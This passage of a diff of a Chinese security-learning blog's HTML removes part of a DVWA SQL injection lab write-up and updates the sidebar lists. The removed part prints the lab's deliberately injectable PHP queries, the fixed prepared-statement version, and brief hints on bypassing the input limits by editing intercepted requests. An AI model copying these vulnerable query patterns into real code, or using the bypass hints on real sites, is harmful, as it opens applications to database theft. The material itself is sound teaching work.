$row[<span class="string">&quot;first_name&quot;</span>];     </span><br><span class="line">      $last = $row[<span class="string">&quot;last_name&quot;</span>];     </span><br><span class="line">      </span><br><span class="line">      <span class="comment">// Feedback for end user     </span></span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;   &#125;   </span><br><span class="line">      mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]); </span><br><span class="line">      &#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
-
-<h1 id="Medium："><a href="#Medium：" class="headerlink" title="Medium："></a>Medium：</h1><p>查看源码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123; </span><br><span class="line"></span><br><span class="line">  <span class="comment">//Get input*</span></span><br><span class="line">  $id = $_POST[ <span class="string">&#x27;id&#x27;</span> ]; </span><br><span class="line"></span><br><span class="line">  $id = mysql_real_escape_string( $id ); </span><br><span class="line"></span><br><span class="line">  $query = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="subst">$id</span>;&quot;</span>; </span><br><span class="line">  $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> ); </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  <span class="comment">//Get results </span></span><br><span class="line"><span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123; </span><br><span class="line">        <span class="comment">//Display values</span></span><br><span class="line">        $first = $row[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        $last  = $row[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This is used later on in the index.php page</span></span><br><span class="line"><span class="comment">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span></span><br><span class="line">$query  = <span class="string">&quot;SELECT COUNT(*) FROM users;&quot;</span>;</span><br><span class="line">$result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line">$number_of_rows = mysqli_fetch_row( $result )[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
-
-<p>我们可以看到服务器使用mysql_real_escape_string()函数过滤了一些字符（其中包括反斜杠，单双引号），同时网页端选择了下拉选择菜单限制我们输入。但是我们看到本关的注入点为数字型，那么我们可以利用抓包的方式修改上传数据。![7](DVWA—SQL Injection/7.png)</p>
-<h1 id="High："><a href="#High：" class="headerlink" title="High："></a>High：</h1><p>查看源码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_SESSION [ <span class="string">&#x27;id&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_SESSION[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $query  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27; LIMIT 1;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>], $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        $first = $row[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        $last  = $row[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);        </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
-
-<p>我们注意到这关的数据提交页面和查询结果返回页面不是同一个页面</p>
-<p>![8](DVWA—SQL Injection/8.png)</p>
-<p>但是这关如果用手工注入的话，难度和Low级别是一样的，那么这关针对防御的是一般的sqlmap注入，因为sqlmap在注入过程中，无法在数据提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。</p>
-<h1 id="Impossible："><a href="#Impossible：" class="headerlink" title="Impossible："></a>Impossible：</h1><p>查看源码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_GET[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered?</span></span><br><span class="line">    <span class="keyword">if</span>(is_numeric( $id )) &#123;</span><br><span class="line">        <span class="comment">// Check the database</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">&#x27;:id&#x27;</span>, $id, PDO::PARAM_INT );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line">        $row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Make sure only 1 result is returned</span></span><br><span class="line">        <span class="keyword">if</span>( $data-&gt;rowCount() == <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="comment">// Get values</span></span><br><span class="line">            $first = $row[ <span class="string">&#x27;first_name&#x27;</span> ];</span><br><span class="line">            $last  = $row[ <span class="string">&#x27;last_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
-
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/leezhxing/p/5282437.html">https://www.cnblogs.com/leezhxing/p/5282437.html</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/03/09/DVWA%E2%80%94SQL%20Injection/" data-id="ckm5oxbg900038svu4hdp18h0" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/DVWA-labs/" rel="tag">DVWA-labs</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
 
 
   <nav id="page-nav">
@@ -957,7 +1146,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/" style="font-size: 15px;">C语言学习</a> <a href="/tags/DVWA-labs/" style="font-size: 17.5px;">DVWA-labs</a> <a href="/tags/DVWA%E2%80%94labs/" style="font-size: 10px;">DVWA—labs</a> <a href="/tags/HPPT/" style="font-size: 10px;">HPPT</a> <a href="/tags/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%90%AF%E5%8A%A8/" style="font-size: 10px;">MySQL数据库的搭建与启动</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a> <a href="/tags/bugku/" style="font-size: 10px;">bugku</a> <a href="/tags/dvwa%E2%80%94labs/" style="font-size: 10px;">dvwa—labs</a> <a href="/tags/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/" style="font-size: 10px;">mysql数据库的使用</a> <a href="/tags/sqlilabs/" style="font-size: 20px;">sqlilabs</a> <a href="/tags/upload-labs/" style="font-size: 12.5px;">upload-labs</a> <a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 12.5px;">web渗透</a> <a href="/tags/%E5%88%B7%E9%A2%98/" style="font-size: 12.5px;">刷题</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/" style="font-size: 10px;">数据库的增删改查</a>
+      <a href="/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/" style="font-size: 16px;">C语言学习</a> <a href="/tags/DVWA-labs/" style="font-size: 18px;">DVWA-labs</a> <a href="/tags/DVWA%E2%80%94labs/" style="font-size: 10px;">DVWA—labs</a> <a href="/tags/HPPT/" style="font-size: 10px;">HPPT</a> <a href="/tags/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%90%AF%E5%8A%A8/" style="font-size: 10px;">MySQL数据库的搭建与启动</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a> <a href="/tags/bugku/" style="font-size: 10px;">bugku</a> <a href="/tags/dvwa%E2%80%94labs/" style="font-size: 10px;">dvwa—labs</a> <a href="/tags/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/" style="font-size: 10px;">mysql数据库的使用</a> <a href="/tags/sqlilabs/" style="font-size: 20px;">sqlilabs</a> <a href="/tags/upload-labs/" style="font-size: 12px;">upload-labs</a> <a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 12px;">web渗透</a> <a href="/tags/%E5%88%B7%E9%A2%98/" style="font-size: 14px;">刷题</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/" style="font-size: 10px;">数据库的增删改查</a>
     </div>
   </div>
 
@@ -966,7 +1155,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
     </div>
   </div>
 
@@ -979,6 +1168,14 @@
       <ul>
         
           <li>
+            <a href="/2021/04/05/buuctf/">buuctf</a>
+          </li>
+        
+          <li>
+            <a href="/2021/04/04/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/">正则匹配</a>
+          </li>
+        
+          <li>
             <a href="/2021/03/18/DVWA%E2%80%94JS/">JS</a>
           </li>
         
@@ -988,14 +1185,6 @@
         
           <li>
             <a href="/2021/03/16/bugku/">bugku(1)</a>
-          </li>
-        
-          <li>
-            <a href="/2021/03/13/DVWA%E2%80%94XSS/">DVWA—XSS</a>
-          </li>
-        
-          <li>
-            <a href="/2021/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B61/">攻防世界web进阶</a>
           </li>
         
       </ul>
